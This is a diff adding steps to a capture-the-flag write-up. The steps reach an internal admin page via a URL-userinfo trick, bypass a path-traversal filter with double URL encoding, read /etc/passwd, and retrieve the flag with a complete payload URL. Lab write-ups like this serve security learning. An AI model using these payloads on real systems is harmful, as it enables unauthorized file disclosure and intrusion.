@@ -49,6 +49,107 @@ google.com@127.0.0.1
 
 ![image](https://github.com/user-attachments/assets/7bcc45d7-acb9-4df8-ab94-8e91fc0e4d3d)
 
-- 
+- The output gets rendered as an image as seen below.
+
+```html
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CTF Challenge</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        .error {
+            color: red;
+            margin-bottom: 10px;
+        }
+        .success {
+            color: green;
+            margin-bottom: 10px;
+        }
+        input[type="text"], input[type="password"], input[type="file"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+        }
+        .user-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        .user-table th, .user-table td {
+            padding: 8px;
+            border: 1px solid #ddd;
+            text-align: left;
+        }
+        .user-table th {
+            background-color: #f2f2f2;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        
+    <h1>Login</h1>
+    
+    <form method="post">
+        <input type="text" name="username" placeholder="Username" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Login</button>
+    </form>
+    <p>Don't have an account? <a href="/register">Register here</a></p>
+
+    </div>
+</body>
+</html>
+```
+- I accessed the admin page next and noticed an endpoint that allows us to view files.
+
+![image](https://github.com/user-attachments/assets/f9a7d216-fe71-4043-b1ab-1846a008312a)
+
+- This functionality will be a good stand to test path traversal to gain `Arbitrary file read`.I tried the basic `../../` but I got a 403 error.
+
+![image](https://github.com/user-attachments/assets/43d48383-dfe2-4dfd-a058-e1de48655628)
+
+- I tested the double-url encoded trick which worked.I was able to read the passwd file.
+
+![image](https://github.com/user-attachments/assets/d9898361-24b0-4560-89cd-69e378a3413c)
+
+- After checking the common spots for the flag file.I could not find the file.I rechecked the admin page for hints and I got one.A php file points to the flag which is being stored at `/var/flag/flag.txt`.
+
+![image](https://github.com/user-attachments/assets/cf2e2e16-f67c-45dc-84f5-c0a58ad43c3d)
+
+![image](https://github.com/user-attachments/assets/14f943ee-7bea-4765-a7a1-2e82ee0382a4)
+
+- I read the flag with this payload-:
+
+```url
+http://6.tcp.eu.ngrok.io:16967@127.0.0.1/admin/view_file?file=%252E%252E%252F%252E%252E%252Fvar%252Fflag%252Fflag.txt
+```
+
+
+
+
+
+
+
 
 
